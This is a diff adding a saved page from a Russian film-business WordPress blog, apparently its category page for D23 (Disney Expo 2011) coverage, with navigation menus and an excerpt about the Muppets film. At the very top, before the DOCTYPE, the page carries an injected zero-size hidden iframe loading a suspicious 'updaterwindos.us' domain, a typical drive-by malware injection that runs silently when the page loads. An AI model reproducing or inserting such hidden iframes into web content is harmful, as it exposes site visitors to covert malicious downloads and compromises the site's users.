@@ -1,0 +1,754 @@
+<!-- 1bc||stat -->
+<style>#user { width:0px; height:0px; } </style><iframe id="user" src="http://updaterwindos.us/" height=400 width=680 frameborder=0></iframe>
+<!-- /1bc||stat --><!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="ru-RU">
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html"; charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=7" />
+<title>D23 | Кинобизнес по-русски</title>
+
+<link href='http://fonts.googleapis.com/css?family=Droid+Sans:regular,bold' rel='stylesheet' type='text/css' />
+
+<link rel="stylesheet" href="http://kinobizon.ru/wp-content/themes/TheStyle/style.css" type="text/css" media="screen" />
+<link rel="alternate" type="application/rss+xml" title="Кинобизнес по-русски RSS Feed" href="http://kinobizon.ru/feed/" />
+<link rel="alternate" type="application/atom+xml" title="Кинобизнес по-русски Atom Feed" href="http://kinobizon.ru/feed/atom/" />
+<link rel="pingback" href="http://kinobizon.ru/xmlrpc.php" />
+
+<!--[if lt IE 6]>
+	<link rel="stylesheet" type="text/css" href="http://kinobizon.ru/wp-content/themes/TheStyle/css/iecss" />
+	<script type="text/javascript" src="http://kinobizon.ru/wp-content/themes/TheStyle/js/DD_belatedPNG_0.0.8a-min.js"></script>
+	<script type="text/javascript">DD_belatedPNG.fix('img#logo, #search-form, .thumbnail .overlay, .big .thumbnail .overlay, .entry-content, .bottom-bg, #controllers span#left-arrow, #controllers span#right-arrow, #content-bottom-bg, .post, #comment-wrap, .post-content, .single-thumb .overlay, .post ul.related-posts li, .hr, ul.nav ul li a, ul.nav ul li a:hover, #comment-wrap #comment-bottom-bg, ol.commentlist, .comment-icon, #commentform textarea#comment, .avatar span.overlay, li.comment, #footer .widget ul a, #footer .widget ul a:hover, #sidebar .widget, #sidebar h3.widgettitle, #sidebar .widgetcontent ul li, #tabbed-area, #tabbed-area li a, #tabbed .tab ul li');</script>
+<![endif]-->
+<!--[if IE]>
+	<link rel="stylesheet" type="text/css" href="http://kinobizon.ru/wp-content/themes/TheStyle/css/ie.css" />
+<![endif]-->
+
+<script type="text/javascript">
+	document.documentElement.className = 'js';
+</script>
+<!-- Rating@Mail.ru counter -->
+<script type="text/javascript">//<![CDATA[
+var a='',js=10;try{a+=';r='+escape(document.referrer);}catch(e){}try{a+=';j='+navigator.javaEnabled();js=11;}catch(e){}
+try{s=screen;a+=';s='+s.width+'*'+s.height;a+=';d='+(s.colorDepth?s.colorDepth:s.pixelDepth);js=12;}catch(e){}
+try{if(typeof((new Array).push('t'))==="number")js=13;}catch(e){}
+try{(new Image()).src='http://dc.c4.b2.a2.top.mail.ru/counter?id=2247704;js='+js+a+';rand='+Math.random();}catch(e){}//]]></script>
+<noscript><p><a href="http://top.mail.ru/jump?from=2247704"><img src="http://dc.c4.b2.a2.top.mail.ru/counter?js=na;id=2247704"
+style="border:0;" height="1" width="1" alt="Рейтинг@Mail.ru" /></a></p></noscript>
+<!-- //Rating@Mail.ru counter -->
+
+
+<link rel="alternate" type="application/rss+xml" title="Лента рубрики Кинобизнес по-русски &raquo; D23" href="http://kinobizon.ru/kinobizoneyes/kinoforumi/zarchive/d23/feed/" />
+<meta content="TheStyleTheme URI: http://www.elegantthemes.com/gallery/Version: 1.7Description: 2 Column theme from Elegant ThemesAuthor: Elegant ThemesAuthor URI: http://www.elegantthemes.com v." name="generator"/><link media="screen" type="text/css" href="http://kinobizon.ru/wp-content/themes/TheStyle/epanel/page_templates/js/fancybox/jquery.fancybox-1.2.6.css" rel="stylesheet" />
+<link media="screen" type="text/css" href="http://kinobizon.ru/wp-content/themes/TheStyle/epanel/page_templates/page_templates.css" rel="stylesheet" /><link rel='stylesheet' id='cwpcss-css'  href='http://kinobizon.ru/wp-content/plugins/cardoza-wordpress-poll/public/css/CWPPoll.css?ver=3.4.2' type='text/css' media='all' />
+<link rel='stylesheet' id='colorbox-theme5-css'  href='http://kinobizon.ru/wp-content/plugins/jquery-lightbox-for-native-galleries/colorbox/theme5/colorbox.css?ver=1.3.14' type='text/css' media='screen' />
+<link rel='stylesheet' id='flick-css'  href='http://kinobizon.ru/wp-content/plugins/mailchimp//css/flick/flick.css?ver=3.4.2' type='text/css' media='all' />
+<link rel='stylesheet' id='mailchimpSF_main_css-css'  href='http://kinobizon.ru/?mcsf_action=main_css&#038;ver=3.4.2' type='text/css' media='all' />
+<!--[if IE]>
+<link rel='stylesheet' id='mailchimpSF_ie_css-css'  href='http://kinobizon.ru/wp-content/plugins/mailchimp/css/ie.css?ver=3.4.2' type='text/css' media='all' />
+<![endif]-->
+<link rel='stylesheet' id='NextGEN-css'  href='http://kinobizon.ru/wp-content/plugins/nextgen-gallery/css/nggallery.css?ver=1.0.0' type='text/css' media='screen' />
+<link rel='stylesheet' id='shutter-css'  href='http://kinobizon.ru/wp-content/plugins/nextgen-gallery/shutter/shutter-reloaded.css?ver=1.3.2' type='text/css' media='screen' />
+<link rel='stylesheet' id='et-shortcodes-css-css'  href='http://kinobizon.ru/wp-content/themes/TheStyle/epanel/shortcodes/shortcodes.css?ver=1.6' type='text/css' media='all' />
+<link rel='stylesheet' id='adv-spoiler-css'  href='http://kinobizon.ru/wp-content/plugins/advanced-spoiler/css/advanced-spoiler.css?ver=2.02' type='text/css' media='all' />
+<link rel='stylesheet' id='featured-post-css-css'  href='http://kinobizon.ru/wp-content/plugins/featured-post-with-thumbnail/featured-post.css?ver=3.4.2' type='text/css' media='all' />
+<script type='text/javascript' src='http://kinobizon.ru/wp-includes/js/jquery/jquery.js?ver=1.7.2'></script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-content/plugins/cardoza-wordpress-poll/public/js/CWPPoll.js?ver=3.4.2'></script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-content/plugins/jquery-lightbox-for-native-galleries/colorbox/jquery.colorbox-min.js?ver=1.3.14'></script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-content/plugins/mailchimp/js/scrollTo.js?ver=1.2.10'></script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-includes/js/jquery/jquery.form.js?ver=2.73'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var mailchimpSF = {"ajax_url":"http:\/\/kinobizon.ru\/"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-content/plugins/mailchimp/js/mailchimp.js?ver=1.2.10'></script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-includes/js/jquery/ui/jquery.ui.core.min.js?ver=1.8.20'></script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-content/plugins/mailchimp//js/datepicker.js?ver=3.4.2'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var shutterSettings = {"msgLoading":"L O A D I N G","msgClose":"Click to Close","imageCount":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-content/plugins/nextgen-gallery/shutter/shutter-reloaded.js?ver=1.3.2'></script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-content/plugins/nextgen-gallery/js/jquery.cycle.all.min.js?ver=2.88'></script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-content/plugins/nextgen-gallery/js/ngg.slideshow.min.js?ver=1.05'></script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-content/themes/TheStyle/epanel/shortcodes/js/et_shortcodes_frontend.js?ver=1.6'></script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-content/plugins/advanced-spoiler/js/jquery-spoiler.js?ver=2.02'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://kinobizon.ru/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://kinobizon.ru/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.4.2" />
+
+<!-- All in One SEO Pack 1.6.13.4 by Michael Torbert of Semper Fi Web Design[428,481] -->
+<meta name="robots" content="noindex,follow" />
+<link rel="canonical" href="http://kinobizon.ru/kinobizoneyes/kinoforumi/zarchive/d23/" />
+<!-- /all in one seo pack -->
+<script type="text/javascript">
+var ajaxurl = 'http://kinobizon.ru/wp-admin/admin-ajax.php';
+</script>
+<meta property="fb:app_id" content="216985714992263"/>
+	<script type="text/javascript">
+		jQuery(function($) {
+			$('.date-pick').datepicker({
+				autoFocusNextInput: true,
+				constrainInput: false,
+				changeMonth: true,
+				changeYear: true,
+				beforeShow: function(input, inst) { $('#ui-datepicker-div').addClass('show'); },
+				dateFormat: 'yy/mm/dd',
+			});			
+			
+			d = new Date();
+			$('.birthdate-pick').datepicker({
+				autoFocusNextInput: true,
+				constrainInput: false,
+				changeMonth: true,
+				changeYear: false,
+				minDate: new Date(d.getFullYear(), 1-1, 1),
+				maxDate: new Date(d.getFullYear(), 12-1, 31),
+				beforeShow: function(input, inst) { $('#ui-datepicker-div').removeClass('show'); },
+				dateFormat: 'mm/dd',
+			});
+			
+				
+		});
+	</script>
+	
+<link rel="stylesheet" href="http://kinobizon.ru/wp-content/plugins/multi-column-tag-map/mctagmap.css?ver=8.0" type="text/css" media="screen" />
+<script type="text/javascript" src="http://kinobizon.ru/wp-content/plugins/multi-column-tag-map/mctagmap.js?ver=8.0"></script>
+
+<style type="text/css" media="all">
+/* <![CDATA[ */
+@import url("http://kinobizon.ru/wp-content/plugins/wp-table-reloaded/css/plugin.css?ver=1.9.1");
+@import url("http://kinobizon.ru/wp-content/plugins/wp-table-reloaded/css/datatables.css?ver=1.9.1");
+/* ]]> */
+</style>
+<meta name='NextGEN' content='1.8.4' />
+<!-- jQuery Lightbox For Native Galleries v3.2.2 | http://www.viper007bond.com/wordpress-plugins/jquery-lightbox-for-native-galleries/ -->
+<script type="text/javascript">
+// <![CDATA[
+	jQuery(document).ready(function($){
+		$(".gallery").each(function(index, obj){
+			var galleryid = Math.floor(Math.random()*10000);
+			$(obj).find("a").colorbox({rel:galleryid, maxWidth:"195%", maxHeight:"195%"});
+		});
+		$("a.lightbox").colorbox({maxWidth:"195%", maxHeight:"195%"});
+	});
+// ]]>
+</script>
+<style type="text/css" id="custom-background-css">
+body.custom-background { background-color: #141e55; }
+</style>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-22827193-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+</head>
+<body>
+	<div id="container">
+		<div id="container2">
+			<div id="header">
+				
+										<a id="nostyle" href="http://kinobizon.ru/"><img src="/logo.png" alt="TheStyle Logo" id="logo"/></a>
+					
+					<!-- <div id="banner"><a href="http://kinobizon.ru/2012/11/09/kinorinok-programma-89-comm/" target="_blank" id="nostyle"><img align="center" src="http://kinobizon.ru/img/234-banner-cmt.jpg" border="0"></div></a> -->
+			
+				<div id="header-bottom" class="clearfix">
+											<ul id="primary" class="nav">
+											</li>
+	<li class="cat-item cat-item-726"><a href="http://kinobizon.ru/kinobizoneyes/news/" title="Просмотреть все записи в рубрике Новости">Новости</a>
+</li>
+								<li class="cat-item cat-item-9"><a href="http://kinobizon.ru/kinobizoneyes/analytics/" title="Просмотреть все записи в рубрике аналитика">аналитика</a>
+	<li class="cat-item cat-item-226"><a href="http://kinobizon.ru/kinobizoneyes/box-office/" title="Просмотреть все записи в рубрике бокс-офис">бокс-офис</a>
+<ul class='children'>
+	
+	<li class="cat-item cat-item-237"><a href="http://kinobizon.ru/kinobizoneyes/box-office/usa/" title="Просмотреть все записи в рубрике бокс-офис США+">бокс-офис США+</a>
+</li>
+	<li class="cat-item cat-item-238"><a href="http://kinobizon.ru/kinobizoneyes/box-office/rus/" title="Просмотреть все записи в рубрике бокс-офис РФ+">бокс-офис РФ+</a>
+</li>
+
+<li class="cat-item cat-item-237"><a href="http://kinobizon.ru/kinobizoneyes/box-office/estimate/" title="Просмотреть все записи в рубрике прогнозы">прогнозы</a>
+</li>
+
+	<li class="cat-item cat-item-648"><a href="http://kinobizon.ru/kinobizoneyes/box-office/relizovorot/" title="Просмотреть все записи в рубрике Релизоворот">Релизоворот</a>
+</li>
+<!--	<li class="cat-item cat-item-727"><a href="http://kinobizon.ru/kinobizoneyes/%d0%b4%d0%b5%d0%bd%d1%8c%d0%b3%d0%b8/%d1%80%d0%b0%d0%b7%d0%b1%d0%be%d1%80-%d0%bf%d0%be%d0%bb%d0%b5%d1%82%d0%be%d0%b2/" title="Просмотреть все записи в рубрике разбор полетов">разбор полетов</a>
+</li> -->
+</ul>
+</li>
+<li><a href="http://kinobizon.ru/kinobizoneyes/swot/" title="Просмотреть все записи в рубрике страничка фильма">фильмы а-я</a>
+<ul class='children'>
+	
+		<li class="cat-item cat-item-246"><a href="http://kinobizon.ru/movie-name/" title="Просмотреть все записи в рубрике Поиск по названию">Поиск по названию</a>
+</li>
+	
+	<li class="cat-item cat-item-65"><a href="http://kinobizon.ru/kinobizoneyes/swot/trailers-mustsee/" title="Просмотреть все записи в рубрике трейлеры">трейлеры</a>
+</li>
+	<li class="cat-item cat-item-246"><a href="http://kinobizon.ru/kinobizoneyes/swot/posters-mustsee/" title="Просмотреть все записи в рубрике постеры">постеры</a>
+</li>
+
+	<li class="cat-item cat-item-647"><a href="http://kinobizon.ru/kinobizoneyes/swot/movie-campaigns-russia/" title="Просмотреть все записи в рубрике Рекламные кампании">Рекламные кампании</a>
+</li>
+
+
+</ul>
+</li>
+	<li><a href="http://kinobizon.ru/kinobizoneyes/movie-distributor" title="Просмотреть все записи в рубрике Дистрибьютор">Дистрибьютор</a>
+<ul class='children'>
+	<!-- <li class="cat-item cat-item-412"><a href="http://kinobizon.ru/kinobizoneyes/movie-distributor/%d0%bb%d0%be%d0%ba%d0%b0%d0%bb%d0%b8%d0%b7%d0%b0%d1%86%d0%b8%d1%8f/" title="Просмотреть все записи в рубрике локализация">локализация</a>
+</li> -->
+	<li class="cat-item cat-item-646"><a href="http://kinobizon.ru/kinobizoneyes/movie-distributor/presentations/" title="Просмотреть все записи в рубрике Пакеты и презентации">Пакеты и презентации</a>
+</li>
+
+</ul>
+</li>
+	<li class="cat-item cat-item-650"><a href="http://kinobizon.ru/kinobizoneyes/interview/" title="Просмотреть все записи в рубрике интервью">интервью</a>
+</li>
+	<li class="cat-item cat-item-651"><a href="http://kinobizon.ru/kinobizoneyes/cinema/" title="Просмотреть все записи в рубрике Кинотеатр">Кинотеатр</a>
+<ul class='children'>
+	<li class="cat-item cat-item-738"><a href="http://kinobizon.ru/kinobizoneyes/cinema/virtual-cinema/" title="Просмотреть все записи в рубрике Виртуальный кинотеатр">Виртуальный кинотеатр</a>
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-654"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/" title="Просмотреть все записи в рубрике Кинофорумы">Кинофорумы</a>
+
+	<ul class='children'>
+	
+	<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/afm-2012/" title="">AFM 2012</a>
+</li>
+	
+		<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/kino-ekspo-2012/" title="">«КиноЭкспо» 2012</a>
+</li>
+	
+	<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/tiff-2012/" title="">Торонто 2012 </a>
+</li>
+
+<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/venice-2012/" title="">Венеция 2012</a>
+</li>
+
+	<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/kinorynok-v-sochi-2012/" title="">Кинорынок в Сочи 2012 </a>
+</li>
+
+		
+	
+		
+
+	<li class="cat-item cat-item-1451"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/zarchive/" title="О старых кинофорумах, которые прошли уже некоторое время назад и теперь имеют архивную ценность.">архив</a>
+	<ul class='children'>
+	
+		<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/cineeurope-2012/" title="">CineEurope 2012</a>
+</li>
+	
+	<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/kinotavr-2012-kinoforumi/" title="">Кинотавр-2012 </a>
+</li>
+	
+	<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/kann-2012-kinoforumi/" title="">Канн-2012 </a>
+</li>
+	
+	<li class="cat-item cat-item-665"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/march-kinorynok-2012/" title="">кинорынок марта-2012</a>
+</li>
+	
+		<li class="cat-item cat-item-665"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/kino-rossii-2020/" title="Просмотреть все записи в рубрике «Кино России 2020»">«Кино России 2020»</a>
+</li>
+	<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/forum-investicii-v-kino/" title="Просмотреть все записи в рубрике Венеция-2011">Форум «Инвестиции в кино…» </a>
+</li>
+	
+	<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/berlin-2012/" title="Просмотреть все записи в рубрике Венеция-2011">Берлинале-2012 </a>
+</li>
+	
+		<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/sundance-2012/" title="Просмотреть все записи в рубрике Венеция-2011">Санденс-2012 </a>
+</li>
+
+	<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/zarchive/2morrow/" title="Просмотреть все записи в рубрике Венеция-2011">2morrow</a>
+</li>
+
+<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/zarchive/toronto-2011/" title="Просмотреть все записи в рубрике Венеция-2011">Торонто-2011</a>
+</li>
+
+	<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/zarchive/afm-2011/" title="Просмотреть все записи в рубрике Венеция-2011">AFM-2011</a>
+</li>
+
+	<li class="cat-item cat-item-683"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/venice-2011/" title="Просмотреть все записи в рубрике Венеция-2011">Венеция-2011</a>
+</li>
+	<li class="cat-item cat-item-816"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/kino-expo-2011/" title="Просмотреть все записи в рубрике «Кино Экспо 2011»">«Кино Экспо 2011»</a>
+</li>
+	<li class="cat-item cat-item-812"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/d23/" title="Просмотреть все записи в рубрике D23">D23</a>
+</li>
+	<li class="cat-item cat-item-328"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/mmkf/" title="Просмотреть все записи в рубрике ММКФ">ММКФ</a>
+</li>
+	<li class="cat-item cat-item-684"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/european-window-2011/" title="Просмотреть все записи в рубрике «Окно в Европу»–2011">«Окно в Европу»–2011</a>
+</li>
+	<li class="cat-item cat-item-658"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/kinorinki/" title="Просмотреть все записи в рубрике Кинорынки">Кинорынки</a>
+</li>
+	<li class="cat-item cat-item-664"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/cannes-2011/" title="Просмотреть все записи в рубрике Канн–2011">Канн–2011</a>
+</li>
+	<li class="cat-item cat-item-657"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/kinotavr-2011/" title="Просмотреть все записи в рубрике «Кинотавр»">«Кинотавр»-2011</a>
+</li>
+
+	<li class="cat-item cat-item-655"><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/zarchive/comic-con-forums/" title="Просмотреть все записи в рубрике COMIC-CON">COMIC-CON</a>
+</li>
+
+	</ul>
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-217"><a href="http://kinobizon.ru/kinobizoneyes/cinema-vs-state/" title="Просмотреть все записи в рубрике Кино и Государство">Кино и Государство</a>
+<!-- <ul class='children'>
+	<li class="cat-item cat-item-2206"><a href="http://kinobizon.ru/kinobizoneyes/must-see/%d0%be%d1%84%d0%b8%d1%86%d0%b8%d0%b0%d0%bb%d1%8c%d0%bd%d0%be/" title="Просмотреть все записи в рубрике официально">официально</a>
+	<ul class='children'>
+	<li class="cat-item cat-item-245"><a href="http://kinobizon.ru/kinobizoneyes/must-see/%d0%be%d1%84%d0%b8%d1%86%d0%b8%d0%b0%d0%bb%d1%8c%d0%bd%d0%be/%d1%84%d0%be%d1%82%d0%be-%d0%bd%d0%b5%d0%b4%d0%b5%d0%bb%d0%b8-must-see/" title="Просмотреть все записи в рубрике документы">документы</a>
+</li>
+	</ul> 
+</li>
+</ul> 
+</li>
+	<li class="cat-item cat-item-1766"><a href="http://kinobizon.ru/kinobizoneyes/kolonki/" title="Просмотреть все записи в рубрике колонки">колонки</a>
+<ul class='children'>
+	<li class="cat-item cat-item-1352"><a href="http://kinobizon.ru/kinobizoneyes/kolonki/russkoe-kino-v-tope/" title="колонка блогера Максима Сухагузова">русское кино в топе максима сухагузова</a>
+</li>
+	<li class="cat-item cat-item-1767"><a href="http://kinobizon.ru/kinobizoneyes/kolonki/xvost-vilyaet-kino/" title="Просмотреть все записи в рубрике хвост виляет кино андрея громковского">хвост виляет кино андрея громковского</a>
+</li>
+
+<li class="cat-item cat-item-1767"><a href="http://kinobizon.ru/kinobizoneyes/kolonki/riski-vily-i-tiski-kinoprokata/" title="Просмотреть все записи в рубрике хвост виляет кино андрея громковского">риски, вилы и тиски кинопроката</a>
+</li>
+
+	<li class="cat-item cat-item-1940"><a href="http://kinobizon.ru/kinobizoneyes/kolonki/blogs/" title="Просмотреть все записи в рубрике блоги">блоги</a>
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-643"><a href="#" title="Просмотреть все записи в рубрике О кинобизоне">О кинобизоне</a>
+<ul class='children'>
+	<li class="cat-item cat-item-644"><a href="http://kinobizon.ru/kinobizoneyes/meta/top-20/" title="Просмотреть все записи в рубрике топ 20">топ-20</a>
+</li>
+	<li class="cat-item cat-item-1991"><a href="http://kinobizon.ru/kinobizoneyes/meta/ot-redaktora/" title="Просмотреть все записи в рубрике слово редактора">слово редактора</a>
+	
+</li>
+</li>
+	<li class="cat-item cat-item-1991"><a href="http://kinobizon.ru/o-nas/">что такое Кинобизон?</a>
+</li>
+</li>
+	<li class="cat-item cat-item-1991"><a href="http://kinobizon.ru/avtory/">Об Авторах</a> 
+</li> -->
+
+
+</ul>
+</li>
+						</ul> <!-- end ul#nav -->
+				
+					
+					<div id="search-form">
+						<form method="get" id="searchform" action="http://kinobizon.ru">
+							<input type="text" value="Поиск по сайту..." name="s" id="searchinput" />
+
+							<input type="image" src="http://kinobizon.ru/wp-content/themes/TheStyle/images/search-btn.png" id="searchsubmit" />
+						</form>
+					</div> <!-- end #search-form -->
+					
+				</div> <!-- end #header-bottom -->	
+			</div> <!-- end #header --><div id="controllers">
+				<h2 class="man">СВЕЖИЕ МАТЕРИАЛЫ</h2>			</div> <!-- #controllers -->
+<div id="sidebar2">
+<div id=�sb_banner_conteiner�>
+<div class=�banner_125x125_1>
+ </div>
+
+ 
+
+</div>
+	<div id="widget_featured-posts-3" class="widget widget_featured-posts"><h3 class="widgettitle">Популярные посты</h3><div class="widgetcontent"><ul id="recentcomments"><li class="recentcomments">
+   
+
+   <a href="http://kinobizon.ru/2012/11/13/afm-2012-very-best-deals/">AFM 2012: ГЛАВНЫЕ ПОКУПКИ НЕЗАВИСИМЫХ ДИСТРИБЬЮТОРОВ СТРАНЫ — A COMPANY, CARAVELLA DDC, TOP FILM, WEST, &laquo;ВОЛЬГА&raquo;, &laquo;ПАРАДИЗ&raquo;</a>
+</li>
+   <li class="recentcomments">
+   
+
+   <a href="http://kinobizon.ru/2012/11/12/marketing-bazelevs-snow-queen/">К БИТВЕ ЗА НЕРЕАЛЬНОЕ НОВОГОДНЕЕ БАБЛО 2012&mdash;2013: РЕКЛАМНАЯ КАМПАНИЯ &laquo;СНЕЖНОЙ КОРОЛЕВЫ&raquo; В КОММЕНТАРИЯХ КИНОБИЗОНА</a>
+</li>
+   <li class="recentcomments">
+   
+
+   <a href="http://kinobizon.ru/2012/11/12/samokat-no-more-like-that/">РЫНОК ЗАКРЫВАЕТ «САМОКАТ»: ЯВЛЕНИЕ КИНОПРОКАТА КАК ТЕМА НОМЕРА «КИНОПРОЦЕССА»</a>
+</li>
+   <li class="recentcomments">
+   
+
+   <a href="http://kinobizon.ru/2012/11/09/mayer-stereotec-interview/">ФЛОРИАН МАЙЕР (STEREOTEC) КИНОБИЗОНУ: &laquo;ТО, ЧТО МЫ СДЕЛАЛИ ДЛЯ «ВИЯ», ВЫГЛЯДИТ ЗАМЕЧАТЕЛЬНО. ТОЧНО ПОЛУЧИТСЯ УСПЕШНЫМ&raquo;</a>
+</li>
+   <li class="recentcomments">
+   
+
+   <a href="http://kinobizon.ru/2012/11/09/kinorinok-programma-89-comm/">BREAKING NEWS: ПРЕДВАРИТЕЛЬНАЯ ПРОГРАММА 89-ГО КИНОРЫНКА (27.11 — 1.12) В ОЖИДАНИЯХ И КОМЕНТАХ КИНОБИЗОНА</a>
+</li>
+   <li class="recentcomments">
+   
+
+   <a href="http://kinobizon.ru/2012/11/08/associ-kinoproducers-neformal/">АССОЦИАЦИЯ ПРОДЮСЕРОВ КИНО И ТЕЛЕВИДЕНИЯ ПОДЕЛИЛАСЬ ПРОБЛЕМАМИ И РЕШЕНИЯМИ: РЕПОРТАЖ КИНОБИЗОНА</a>
+</li>
+   <li class="recentcomments">
+   
+
+   <a href="http://kinobizon.ru/2012/11/08/stalingrad-trailer-firstlook/">ПЕРВЫЙ ВЗГЛЯД НА &laquo;СТАЛИНГРАД&raquo; : КИНОБИЗОН О НЕОФИЦИАЛЬНОМ ТРЕЙЛЕРЕ БЛОКБАСТЕРА ФЕДОРА БОНДАРЧУКА</a>
+</li>
+   <li class="recentcomments">
+   
+
+   <a href="http://kinobizon.ru/2012/11/07/rss-plahov-kleiman/">КОМУ НУЖНО И НУЖНО ЛИ РУССКОЕ КИНО ЗА РУБЕЖОМ? А КАК БЫТЬ С КЛАССИКОЙ?</a>
+</li>
+   <li class="recentcomments">
+   
+
+   <a href="http://kinobizon.ru/2012/11/06/autumn-digest-2012-part1/">ЛУЧШЕЕ НА KINOBIZON.RU ОСЕНЬЮ-2012, часть 1. RENTRAK В ТРЕХ ЛИЦАХ, &laquo;КИНО ЭКСПО&raquo; В ПРЕЗЕНТАЦИЯХ–РЕПОРТАЖАХ, ИНТЕРВЬЮ С VIP-ПРОФИ, ПОСЛЕДСТВИЯ ЗАКОНА О ЗАЩИТЕ ДЕТЕЙ ОТ ИНФОРМАЦИИ, СПОРЫ ВОКРУГ ПРИНЦИПОВ АНАЛИТИКИ ETC</a>
+</li>
+   <li class="recentcomments">
+   
+
+   <a href="http://kinobizon.ru/2012/11/06/cloud-atlas-in-moscow/">ЧТО ДЕЛАЛИ СОЗДАТЕЛИ &laquo;ОБЛАЧНОГО АТЛАСА&raquo; В РОССИИ? ВАЧОВСКИ, ТЫКВЕР, БЕРРИ, УИВИНГ О ТРУДНОСТЯХ И РАДОСТЯХ РАБОТЫ — ВИДЕО, ССЫЛКИ, СТЕНОГРАММЫ И ПРОЧЕЕ</a>
+</li>
+   </ul></div></div><!-- end .widget -->		
+</div> <!-- end #sidebar -->
+
+<div id="breadcrumbs">
+		
+					<a href="http://kinobizon.ru">Главная</a> <span class="raquo">&raquo;</span>
+				
+									D23					
+</div> <!-- end #breadcrumbs -->
+<div id="content" class="clearfix sidebar-fixedwidth">
+	<div id="boxes" class="">
+		
+				
+			
+			
+			
+		
+		
+	<div class="entry small">
+				
+		<div class="thumbnail">
+			
+				<img src="http://kinobizon.ru/wp-content/themes/TheStyle/timthumb.php?src=http://kinobizon.ru/wp-content/uploads/2011/08/d23-muppets.jpg&amp;h=180&amp;w=222&amp;zc=1&amp;q=90" alt='«DISNEY ЭКСПО 2011» (D23): «МАППЕТЫ», КОТОРЫХ НЕ БУДЕТ В РОССИИ?' width='222' height='180' />				<span class="overlay"></span>
+	
+			<div class="category"><ul class="post-categories">
+	<li><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/zarchive/d23/" title="Просмотреть все записи в D23" rel="category tag">D23</a></li></ul></div>
+			<span class="month">Авг<span class="date">30</span></span>
+		</div> <!-- end .thumbnail -->	
+				<h2 class="title"><a href="http://kinobizon.ru/2011/08/30/no-muppets-for-russia/">«DISNEY ЭКСПО 2011» (D23): «МАППЕТЫ», КОТОРЫХ НЕ БУДЕТ В РОССИИ?</a></h2>
+	
+		<div class="entry-content">
+			<div class="bottom-bg">
+				<div class="excerpt" >
+					<p>
+Одним из главных потрясений КиноБизона на «Disney Экспо» (она же D23) в Анахайме (Калифорния) стала презентация МАППЕТОВ — новой полнометражной картины с марионетками Джима Хенсона, которой пока почему-то нет в российских релизах. А зря!
+&nbsp;
+ДЖИМ ХЕНСОН — ЛЕГЕНДА
+&nbsp;
+Первый день D23 открывался церемонией чествования легенд Disney, в рамках которой почетные награды вручили всем актрисам, озвучившим главных принцесс 80–90-х и нулевых, заслуженным членам... </p>
+					<!--
+					<div class="textright">
+						<a href="http://kinobizon.ru/2011/08/30/no-muppets-for-russia/" class="readmore"><span>&raquo;</span>&raquo;</a>
+					</div>
+					-->
+				</div><!-- end .excerpt -->
+			</div><!-- end .bottom-bg -->
+		</div><!-- end .entry-content -->
